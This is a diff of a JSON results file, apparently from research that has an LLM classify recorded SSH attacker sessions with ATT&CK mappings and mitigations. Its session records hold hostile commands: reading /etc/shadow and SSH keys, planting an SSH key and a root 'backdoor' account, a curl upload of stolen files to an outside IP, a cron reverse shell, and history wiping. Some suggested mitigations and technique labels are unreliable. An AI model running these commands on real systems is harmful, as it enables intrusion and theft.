+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "MÉDIO",
-      "summary": "O invasor realizou exploração manual básica, listando arquivos ocultos, tentando navegar incorretamente em um arquivo como se fosse um diretório e verificando a configuração de rede.",
+      "summary": "O invasor realizou comandos básicos de reconhecimento e verificação de arquivos ocultos e de configuração com espaçamento temporal irregular (7 a 13 segundos), sugerindo digitação manual e exploração interativa do sistema.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
           "technique_id": "T1083",
           "technique_name": "File and Directory Discovery",
           "evidence": "ls -a"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "cd .bashrc"
         },
         {
           "tactic": "Discovery",
@@ -765,13 +1709,13 @@
       ],
       "mitigation_commands": [
         "passwd -l root",
-        "history -c",
+        "faillock --reset",
         "iptables -A INPUT -s 198.51.100.25 -j DROP"
       ],
       "session_id": "hum_02_01b6a903bd25",
       "src_ip": "198.51.100.25",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.21,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.39,
       "comandos": [
         "ls -a",
         "cd .bashrc",
@@ -782,13 +1726,118 @@
   {
     "ordem": 23,
     "session_id": "hum_03_350bf1bd00da",
+    "pausas_segundos": [
+      14,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4,
+      4
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami (+14s)",
+      "[2] uname -a (+4s)",
+      "[3] ls -la (+4s)",
+      "[4] cat /etc/passwd | grep sh (+4s)",
+      "[5] cat /etc/shadow (+4s)",
+      "[6] find / -perm -4000 2>/dev/null (+4s)",
+      "[7] mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys (+4s)",
+      "[8] history -c (+4s)",
+      "[9] exit (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] uname -a",
+      "[3] ls -la",
+      "[4] cat /etc/passwd | grep sh",
+      "[5] cat /etc/shadow",
+      "[6] find / -perm -4000 2>/dev/null",
+      "[7] mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys",
+      "[8] history -c",
+      "[9] exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 2.0,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 2.09,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "CRÍTICO",
-      "summary": "O invasor realizou reconhecimento manual do sistema, tentou ler credenciais sensíveis (/etc/shadow), buscou binários com SUID para escalação de privilégio, adicionou uma chave SSH persistente para acesso futuro e limpou o histórico de comandos.",
+      "summary": "O invasor realizou reconhecimento manual do sistema alvo (whoami, uname, listagem de arquivos, busca por usuários com shell ativo, arquivos de senha e binários SUID), estabeleceu persistência adicionando uma chave SSH autorizada e limpou o histórico antes de sair.",
+      "mitre_attack": [
+        {
+          "tactic": "Descoberta",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "whoami"
+        },
+        {
+          "tactic": "Descoberta",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -a"
+        },
+        {
+          "tactic": "Descoberta",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la, find / -perm -4000 2>/dev/null"
+        },
+        {
+          "tactic": "Coleta",
+          "technique_id": "T1087",
+          "technique_name": "Account Discovery",
+          "evidence": "cat /etc/passwd | grep sh"
+        },
+        {
+          "tactic": "Credencial Access",
+          "technique_id": "T1003",
+          "technique_name": "OS Credential Dumping",
+          "evidence": "cat /etc/shadow"
+        },
+        {
+          "tactic": "Persistência",
+          "technique_id": "T1098.004",
+          "technique_name": "Account Manipulation: SSH Authorized Keys",
+          "evidence": "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys"
+        },
+        {
+          "tactic": "Evasão de Defesa",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "sed -i '/AAAAC3NzaC1lZDI1NTE5AAAAI/d' ~/.ssh/authorized_keys",
+        "passwd -l root",
+        "kill -9 -1",
+        "history -c && history -w"
+      ],
+      "session_id": "hum_03_350bf1bd00da",
+      "src_ip": "198.51.100.44",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 2.09,
+      "comandos": [
+        "whoami",
+        "uname -a",
+        "ls -la",
+        "cat /etc/passwd | grep sh",
+        "cat /etc/shadow",
+        "find / -perm -4000 2>/dev/null",
+        "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys",
+        "history -c",
+        "exit"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento manual pós-exploração para enumerar o sistema operacional, usuários com shell válido, credenciais no arquivo shadow e binários com SUID. Em seguida, estabeleceu persistência adicionando uma chave SSH pública e limpou o histórico de comandos.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -803,16 +1852,16 @@
           "evidence": "uname -a"
         },
         {
+          "tactic": "Discovery",
+          "technique_id": "T1087.001",
+          "technique_name": "Account Discovery: Local Account",
+          "evidence": "cat /etc/passwd | grep sh"
+        },
+        {
           "tactic": "Credential Access",
           "technique_id": "T1003.008",
           "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
-          "evidence": "cat /etc/passwd | grep sh; cat /etc/shadow"
-        },
-        {
-          "tactic": "Privilege Escalation",
-          "technique_id": "T1548.001",
-          "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
-          "evidence": "find / -perm -4000 2>/dev/null"
+          "evidence": "cat /etc/shadow"
         },
         {
           "tactic": "Persistence",
@@ -823,19 +1872,19 @@
         {
           "tactic": "Defense Evasion",
           "technique_id": "T1070.003",
-          "technique_name": "Indicator Removal: Clear Command History",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
           "evidence": "history -c"
         }
       ],
       "mitigation_commands": [
-        "sed -i '/AAAAC3NzaC1lZDI1NTE5AAAAI/d' ~/.ssh/authorized_keys",
+        "sed -i '/ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI/d' ~/.ssh/authorized_keys",
         "passwd -l root",
         "history -c && rm -f ~/.bash_history"
       ],
       "session_id": "hum_03_350bf1bd00da",
       "src_ip": "198.51.100.44",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 2.0,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.94,
       "comandos": [
         "whoami",
         "uname -a",
@@ -852,19 +1901,113 @@
   {
     "ordem": 24,
     "session_id": "hum_04_210b67150fee",
+    "pausas_segundos": [
+      3,
+      3,
+      3,
+      4,
+      4,
+      5,
+      5,
+      5,
+      3
+    ],
+    "comandos_com_tempo": [
+      "[1] id (+3s)",
+      "[2] pwd (+3s)",
+      "[3] ls -la /var/www (+3s)",
+      "[4] find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null (+4s)",
+      "[5] ps aux | grep -E 'mysql|postgres|nginx|apache' (+4s)",
+      "[6] tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow (+5s)",
+      "[7] curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload (+5s)",
+      "[8] rm -f /tmp/backup_dump.tar.gz && history -c (+5s)",
+      "[9] exit (+3s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] id",
+      "[2] pwd",
+      "[3] ls -la /var/www",
+      "[4] find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null",
+      "[5] ps aux | grep -E 'mysql|postgres|nginx|apache'",
+      "[6] tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow",
+      "[7] curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload",
+      "[8] rm -f /tmp/backup_dump.tar.gz && history -c",
+      "[9] exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 1.76,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 2.02,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "CRÍTICO",
-      "summary": "O invasor realizou reconhecimento manual do sistema, buscou arquivos de configuração sensíveis contendo credenciais, tentou comprimir arquivos críticos do sistema (/etc/passwd e /etc/shadow) para exfiltração via HTTP e limpou os rastros da sessão apagando o histórico de comandos.",
+      "summary": "O invasor realizou reconhecimento manual do sistema, buscou por arquivos de configuração sensíveis e credenciais, coletou informações sobre serviços em execução, compactou arquivos críticos do sistema operacional (/etc/passwd e /etc/shadow) e exfiltrou os dados via HTTP POST para um servidor externo, finalizando com a limpeza de rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Descoberta",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "pwd, ls -la /var/www, find / -name '*.env' -o -name 'wp-config.php'"
+        },
+        {
+          "tactic": "Descoberta",
+          "technique_id": "T1057",
+          "technique_name": "Process Discovery",
+          "evidence": "ps aux | grep -E 'mysql|postgres|nginx|apache'"
+        },
+        {
+          "tactic": "Coleta",
+          "technique_id": "T1005",
+          "technique_name": "Data from Local System",
+          "evidence": "tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow"
+        },
+        {
+          "tactic": "Exfiltração",
+          "technique_id": "T1041",
+          "technique_name": "Exfiltration Over C2 Channel",
+          "evidence": "curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload"
+        },
+        {
+          "tactic": "Evasão",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal: Clear Command History",
+          "evidence": "history -c"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l admin",
+        "killall -u admin",
+        "rm -f /tmp/backup_dump.tar.gz",
+        "iptables -A INPUT -s 198.51.100.44 -j DROP",
+        "auditctl -w /etc/shadow -p wa -k shadow_access"
+      ],
+      "session_id": "hum_04_210b67150fee",
+      "src_ip": "198.51.100.44",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 2.02,
+      "comandos": [
+        "id",
+        "pwd",
+        "ls -la /var/www",
+        "find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null",
+        "ps aux | grep -E 'mysql|postgres|nginx|apache'",
+        "tar -czf /tmp/backup_dump.tar.gz /etc/passwd /etc/shadow",
+        "curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload",
+        "rm -f /tmp/backup_dump.tar.gz && history -c",
+        "exit"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor obteve acesso interativo, realizou reconhecimento do sistema de arquivos e serviços em execução, buscou credenciais em arquivos de configuração (.env e wp-config.php), comprimiu arquivos sensíveis do sistema (/etc/passwd e /etc/shadow), exfiltrou os dados via HTTP POST e limpou os rastros removendo o arquivo temporário e o histórico.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
           "technique_id": "T1083",
           "technique_name": "File and Directory Discovery",
-          "evidence": "find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null"
+          "evidence": "ls -la /var/www && find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null"
         },
         {
           "tactic": "Discovery",
@@ -892,15 +2035,15 @@
         }
       ],
       "mitigation_commands": [
-        "passwd -e admin",
+        "passwd -l admin",
+        "kill -9 -u admin",
         "rm -f /tmp/backup_dump.tar.gz",
-        "cat /dev/null > ~/.bash_history && history -c",
-        "sshd -t"
+        "history -c && history -w"
       ],
       "session_id": "hum_04_210b67150fee",
       "src_ip": "198.51.100.44",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.76,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.96,
       "comandos": [
         "id",
         "pwd",
@@ -917,13 +2060,42 @@
   {
     "ordem": 25,
     "session_id": "hum_05_daac67c03d17",
+    "pausas_segundos": [
+      3,
+      3,
+      3,
+      4,
+      5,
+      5,
+      4
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami && hostname (+3s)",
+      "[2] ip a (+3s)",
+      "[3] netstat -tulpn (+3s)",
+      "[4] cat ~/.ssh/id_rsa (+4s)",
+      "[5] crontab -l (+5s)",
+      "[6] echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab (+5s)",
+      "[7] unset HISTFILE && exit (+4s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami && hostname",
+      "[2] ip a",
+      "[3] netstat -tulpn",
+      "[4] cat ~/.ssh/id_rsa",
+      "[5] crontab -l",
+      "[6] echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab",
+      "[7] unset HISTFILE && exit"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 1.96,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 2.02,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "CRÍTICO",
-      "summary": "O invasor obteve acesso root e executou reconhecimento inicial do sistema (whoami, ip, netstat), buscou credenciais SSH, estabeleceu persistência via crontab com uma reverse shell e limpou os rastros desativando o arquivo de histórico.",
+      "summary": "O invasor obteve acesso root e executou reconhecimento inicial do sistema (whoami, ip, netstat), buscou credenciais SSH, estabeleceu persistência via crontab com uma reverse shell e limpou os rastros desativando o histórico antes de sair.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -933,8 +2105,8 @@
         },
         {
           "tactic": "Discovery",
-          "technique_id": "T1016",
-          "technique_name": "System Network Configuration Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
           "evidence": "ip a"
         },
         {
@@ -959,6 +2131,63 @@
           "tactic": "Defense Evasion",
           "technique_id": "T1070.003",
           "technique_name": "Indicator Removal: Clear Command History",
+          "evidence": "unset HISTFILE && exit"
+        }
+      ],
+      "mitigation_commands": [
+        "sed -i '/203.0.113.55/d' /etc/crontab",
+        "passwd -l root",
+        "pkill -u root -f 'bash -i'",
+        "rm -f ~/.ssh/authorized_keys_compromised_check",
+        "history -c && history -w"
+      ],
+      "session_id": "hum_05_daac67c03d17",
+      "src_ip": "198.51.100.44",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 2.02,
+      "comandos": [
+        "whoami && hostname",
+        "ip a",
+        "netstat -tulpn",
+        "cat ~/.ssh/id_rsa",
+        "crontab -l",
+        "echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab",
+        "unset HISTFILE && exit"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor realizou reconhecimento inicial do sistema, coletou chaves SSH privadas, verificou tarefas agendadas e estabeleceu persistência através de uma crontab maliciosa com reverse shell, limpando o histórico de comandos antes de sair.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "whoami && hostname"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1016",
+          "technique_name": "System Network Configuration Discovery",
+          "evidence": "ip a && netstat -tulpn"
+        },
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1552.004",
+          "technique_name": "Unsecured Credentials: Private Keys",
+          "evidence": "cat ~/.ssh/id_rsa"
+        },
+        {
+          "tactic": "Persistence",
+          "technique_id": "T1053.003",
+          "technique_name": "Scheduled Task/Job: Cron",
+          "evidence": "echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
           "evidence": "unset HISTFILE"
         }
       ],
@@ -966,12 +2195,13 @@
         "sed -i '/203.0.113.55/d' /etc/crontab",
         "rm -f ~/.ssh/id_rsa",
         "passwd -l root",
-        "history -c && rm -f ~/.bash_history"
+        "pkill -u root",
+        "history -c"
       ],
       "session_id": "hum_05_daac67c03d17",
       "src_ip": "198.51.100.44",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.96,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.73,
       "comandos": [
         "whoami && hostname",
         "ip a",
@@ -986,13 +2216,45 @@
   {
     "ordem": 26,
     "session_id": "hum_06_b42c8190e103",
+    "pausas_segundos": [
+      5,
+      6,
+      8,
+      9,
+      8,
+      11,
+      9,
+      7
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami (+5s)",
+      "[2] id (+6s)",
+      "[3] ls -la /var/www/ (+8s)",
+      "[4] cd /var/www/html && ls -la (+9s)",
+      "[5] cat /etc/os-release (+8s)",
+      "[6] find / -perm -4000 2>/dev/null (+11s)",
+      "[7] cat ~/.ssh/id_rsa (+9s)",
+      "[8] netstat -tulpn (+7s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] id",
+      "[3] ls -la /var/www/",
+      "[4] cd /var/www/html && ls -la",
+      "[5] cat /etc/os-release",
+      "[6] find / -perm -4000 2>/dev/null",
+      "[7] cat ~/.ssh/id_rsa",
+      "[8] netstat -tulpn"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 1.87,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 2.01,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
-      "severity_level": "CRÍTICO",
-      "summary": "O invasor realizou reconhecimento manual e focado após acesso inicial, verificando privilégios, listando diretórios web, buscando binários com SUID, coletando chaves SSH privadas e analisando portas em escuta, indicando uma exploração interativa.",
+      "severity_level": "ALTO",
+      "summary": "O operador conduziu reconhecimento manual sequencial, verificando privilégios, inspecionando o diretório web, buscando binários com SUID para escalação de privilégios, lendo chaves SSH e mapeando conexões de rede ativas.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -1004,12 +2266,81 @@
           "tactic": "Discovery",
           "technique_id": "T1083",
           "technique_name": "File and Directory Discovery",
-          "evidence": "ls -la /var/www/, cd /var/www/html && ls -la, cat /etc/os-release"
+          "evidence": "ls -la /var/www/, cd /var/www/html && ls -la"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /etc/os-release"
         },
         {
           "tactic": "Privilege Escalation",
           "technique_id": "T1548.001",
-          "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+          "technique_name": "Setuid and Setgid",
+          "evidence": "find / -perm -4000 2>/dev/null"
+        },
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1552.004",
+          "technique_name": "Private Keys",
+          "evidence": "cat ~/.ssh/id_rsa"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1049",
+          "technique_name": "System Network Connections Discovery",
+          "evidence": "netstat -tulpn"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l admin_ti",
+        "pkill -u admin_ti",
+        "rm -f ~/.ssh/id_rsa",
+        "history -c"
+      ],
+      "session_id": "hum_06_b42c8190e103",
+      "src_ip": "198.51.100.77",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 2.01,
+      "comandos": [
+        "whoami",
+        "id",
+        "ls -la /var/www/",
+        "cd /var/www/html && ls -la",
+        "cat /etc/os-release",
+        "find / -perm -4000 2>/dev/null",
+        "cat ~/.ssh/id_rsa",
+        "netstat -tulpn"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "Sessão SSH interativa demonstrando comportamento típico de reconhecimento pós-exploração manual, incluindo verificação de privilégios, inspeção de diretórios web, enumeração de sistema operacional, busca por arquivos SUID e tentativa de roubo de chaves SSH.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "whoami, id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "ls -la /var/www/, cd /var/www/html && ls -la"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /etc/os-release"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1611",
+          "technique_name": "Permission Groups Discovery",
           "evidence": "find / -perm -4000 2>/dev/null"
         },
         {
@@ -1033,8 +2364,8 @@
       ],
       "session_id": "hum_06_b42c8190e103",
       "src_ip": "198.51.100.77",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.87,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.82,
       "comandos": [
         "whoami",
         "id",
@@ -1050,18 +2381,104 @@
   {
     "ordem": 27,
     "session_id": "hum_07_c91e3048f216",
+    "pausas_segundos": [
+      4,
+      6,
+      6,
+      10,
+      6,
+      8,
+      5
+    ],
+    "comandos_com_tempo": [
+      "[1] whoami (+4s)",
+      "[2] sudo -l (+6s)",
+      "[3] cat /etc/passwd (+6s)",
+      "[4] echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd (+10s)",
+      "[5] crontab -l (+6s)",
+      "[6] cat /var/log/auth.log | tail -n 20 (+8s)",
+      "[7] history -c && rm -f ~/.bash_history (+5s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] whoami",
+      "[2] sudo -l",
+      "[3] cat /etc/passwd",
+      "[4] echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
+      "[5] crontab -l",
+      "[6] cat /var/log/auth.log | tail -n 20",
+      "[7] history -c && rm -f ~/.bash_history"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 1.57,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 1.89,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "CRÍTICO",
-      "summary": "O invasor realizou reconhecimento manual pós-exploração, verificou privilégios sudo, listou contas de usuários, criou uma conta de backdoor com privilégios de root, inspecionou tarefas agendadas e logs de autenticação, e finalmente limpou o histórico de comandos para apagar vestígios.",
+      "summary": "O invasor realizou reconhecimento manual pós-exploração (whoami, sudo -l, cat /etc/passwd), injetou uma nova conta com privilégios de root, verificou tarefas agendadas e os logs de autenticação, e finalizou apagando o histórico do shell para cobrir os rastros.",
       "mitre_attack": [
         {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "whoami"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1087.001",
+          "technique_name": "Account Discovery: Local Account",
+          "evidence": "cat /etc/passwd"
+        },
+        {
           "tactic": "Privilege Escalation",
-          "technique_id": "T1548.003",
-          "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+          "technique_id": "T1136.001",
+          "technique_name": "Create Account: Local Account",
+          "evidence": "echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.003",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "evidence": "history -c && rm -f ~/.bash_history"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l backdoor",
+        "sed -i '/^backdoor:/d' /etc/passwd",
+        "pkill -u backdoor",
+        "history -c",
+        "rm -f ~/.bash_history"
+      ],
+      "session_id": "hum_07_c91e3048f216",
+      "src_ip": "203.0.113.19",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.89,
+      "comandos": [
+        "whoami",
+        "sudo -l",
+        "cat /etc/passwd",
+        "echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
+        "crontab -l",
+        "cat /var/log/auth.log | tail -n 20",
+        "history -c && rm -f ~/.bash_history"
+      ]
+    },
+    "resposta_crua_prompt_neutro_com_tempos": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O operador realizou reconhecimento inicial de privilégios (whoami, sudo -l, cat /etc/passwd), injetou um usuário com privilégios de root no arquivo de senhas, verificou tarefas agendadas e logs, e concluiu limpando o histórico de comandos para ocultar rastros.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "whoami"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1078",
+          "technique_name": "Valid Accounts",
           "evidence": "sudo -l"
         },
         {
@@ -1078,16 +2495,16 @@
         }
       ],
       "mitigation_commands": [
-        "passwd -l backdoor",
-        "userdel backdoor",
-        "sed -i '/backdoor/d' /etc/passwd",
-        "pkill -u backdoor",
-        "rm -f ~/.bash_history"
+        "sed -i '/^backdoor:/d' /etc/passwd",
+        "passwd -l root",
+        "pkill -u sysadmin",
+        "history -c",
+        "cat /dev/null > ~/.bash_history"
       ],
       "session_id": "hum_07_c91e3048f216",
       "src_ip": "203.0.113.19",
-      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
-      "tempo_segundos": 1.57,
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.75,
       "comandos": [
         "whoami",
         "sudo -l",
@@ -1102,13 +2519,39 @@
   {
     "ordem": 28,
     "session_id": "hum_08_d73f5021a804",
+    "pausas_segundos": [
+      4,
+      6,
+      7,
+      8,
+      9,
+      6
+    ],
+    "comandos_com_tempo": [
+      "[1] pwd (+4s)",
+      "[2] ls -la /home (+6s)",
+      "[3] cat /etc/group (+7s)",
+      "[4] ss -tulnp (+8s)",
+      "[5] find /etc -writable 2>/dev/null (+9s)",
+      "[6] history -c (+6s)"
+    ],
+    "comandos_sem_tempo": [
+      "[1] pwd",
+      "[2] ls -la /home",
+      "[3] cat /etc/group",
+      "[4] ss -tulnp",
+      "[5] find /etc -writable 2>/dev/null",
+      "[6] history -c"
+    ],
     "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
     "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
-    "tempo_segundos_api": 1.68,
+    "classificacao_prompt_neutro_com_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro_sem_tempos": "ATAQUE_HUMANO_DIRECIONADO",
+    "tempo_segundos_api": 1.74,
     "resposta_crua_prompt_neutro": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
       "severity_level": "ALTO",
-      "summary": "O invasor realizou reconhecimento manual e direcionado após o acesso inicial, investigando o diretório home, grupos do sistema, conexões ativas de rede e procurando por arquivos graváveis em /etc, finalizando com a limpeza do histórico de comandos.",
+      "summary": "O invasor realizou reconhecimento manual e direcionado após o acesso inicial, investigando diretórios de usuários, grupos de sistema, conexões ativas de rede e procurando por arquivos graváveis no diretório /etc, finalizando com a limpeza do histórico para ocultar rastros.",
       "mitre_attack": [
         {
           "tactic": "Discovery",
@@ -1131,21 +2574,70 @@
         {
           "tactic": "Defense Evasion",
           "technique_id": "T1070.003",
-          "technique_name": "Indicator Removal: Clear Command History",
